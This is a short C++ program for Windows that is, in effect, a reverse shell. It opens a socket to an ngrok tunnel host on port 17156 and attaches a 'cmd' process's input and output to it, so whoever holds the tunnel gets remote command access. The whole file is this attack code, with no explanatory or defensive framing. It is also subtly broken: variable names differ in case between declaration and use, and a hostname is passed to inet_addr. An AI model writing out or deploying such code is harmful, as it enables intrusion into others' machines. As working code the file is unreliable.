#include <Winsock2.h>
#include <Windows.h>
#include <iostream>

int main() {

	std::string IP_ADDR = "0.tcp.ngrok.io";
	int PORT = 17156;

	WSADATA wsaData;

	int WSAStartup_Result = WSAStartup(MAKEWORD(2,2), &wsaData);

	if (WSAStartup_Result != 0) {
		return 1;
	}

	SOCKET SOCK = WSASocketA(2,1,6,NULL,0,NULL);
	
	struct sockaddr_in sa;
	sa.sin_family = AF_INET;
	sa.sin_addr.s_addr = inet_addr(IP_ADDR.c_str());
	sa.sin_port = htons(PORT);

	int CON_RESULT = connect(SOCK, (struct sockaddr*) &sa, sizeof(sa));
	if (CON_RESULT != 0) {
		return 1;
	}

	STARTUPINFO SI;
	memset(&si, 0, sizeof(SI));
	si.cb = sizeof(si);
	si.dwFlags = (START_USESTDHANDLES);
	si.hStdInput = (HANDLE)SOCK;
	si.hStdOutput = (HANDLE)SOCK;
	si.hStdError = (HANDLE)SOCK;
	PROCESS_INFORMATION PI;

	CreateProcessA(NULL, "cmd", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);

}
